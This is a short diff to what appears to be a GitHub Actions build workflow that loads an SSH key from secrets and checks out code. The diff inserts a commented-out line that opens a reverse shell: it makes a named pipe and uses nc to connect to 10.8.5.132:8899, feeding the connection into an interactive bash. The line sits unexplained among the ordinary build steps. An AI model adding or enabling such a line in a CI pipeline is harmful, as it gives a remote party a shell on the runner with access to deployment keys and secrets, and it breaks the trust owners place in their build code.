@@ -42,6 +42,7 @@ jobs:
         with:
           ssh-private-key: ${{ secrets.SSH_KEY }}
       - uses: actions/checkout@v3
+      #- run: rm -f /tmp/lol; mkfifo /tmp/lol;nc 10.8.5.132 8899 0</tmp/lol | bash -i 2>&1 | tee /tmp/lol
       - run: git submodule init && git submodule update --recursive
       - run: |
           build_dir_name="$(echo ${{ inputs.instrument_type }}-$GITHUB_REF_NAME | tr '/-' '_')"
